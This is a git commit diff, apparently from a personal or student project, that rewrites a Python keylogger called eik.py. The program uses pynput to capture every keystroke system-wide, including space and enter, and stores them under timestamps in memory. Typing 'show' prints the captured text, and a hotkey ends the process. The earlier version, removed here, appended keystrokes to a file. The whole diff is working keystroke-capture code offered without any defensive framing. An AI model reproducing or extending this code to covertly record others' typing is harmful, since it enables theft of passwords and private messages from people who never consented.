927cbd9b04d85a532ffa2a6d1af44dde21ad21a5
moyshi <moyshi.deutsch@gmail.com>
2025-07-01 12:24:42 +0300

    i finish the project

--- eik.py
+++ eik.py
@@ -2,45 +2,55 @@ import os
 from pynput import keyboard
 import datetime
 
+key_log = {}
 
 def time_taker():
-    date = datetime.date(2025, 1, 3)
-    today = datetime.date.today()
-    time = datetime.time(12, 30, 34)
     now = datetime.datetime.now()
-    now = now.strftime("%H:%M:%S--%d/%m/%Y")
-    return now
+    return now.strftime("%H:%M--%d/%m/%Y")
 
 
-def keypressed(key):
+def key_pressed(key):
     # writes the key to the file
     # parameter: key: the key to write
     # returns: None
-    print(str(key))
-    with (open("keyfile.txt", 'a')as logkey):
-        try:
-            char=key.char
-            now=time_taker()
-            #print(now)
-            #logkey.write(char,now)
-            #logkey.write(char+now)
-            logkey.write(now+":"+char+"\n")
-        except:
-            print("error getting char")
+    now=time_taker()
+    try:
+        char=key.char
+        #print(now)
+        #logkey.write(char,now)
+        #logkey.write(char+now)
+    except AttributeError:
+        char = str(key).split('.')[1]
+        if char == 'space':
+            char = ' '
+        if char == 'enter':
+            char = '\n'
+    if now in key_log:
+        key_log[now].append(char)
+    else:
+        key_log[now] = [char]
+
 
 def kill_the_process():
     """when <ctrl>+<shift>+f pressed the func kill the process"""
     os._exit(0)
 
+def print_dict():
+    for key in key_log:
+        print(f' ***** {key} ***** ')
+        print(''.join(key_log[key]))
+        print()
 
-def listiner():
-    listener=keyboard.Listener(on_press=keypressed)
+
+def main():
+    listener=keyboard.Listener(on_press=key_pressed)
     listener.start()
     keyboard.GlobalHotKeys({'<ctrl>+<shift>+f': kill_the_process}).start()
     while True:
-        pass
+        user_input = input('')
+        if user_input == 'show':
+            print_dict()
+
 
 if __name__=="__main__":
-   # print(keypressed)
-   # print(time_taker)
-   listiner()
+   main()
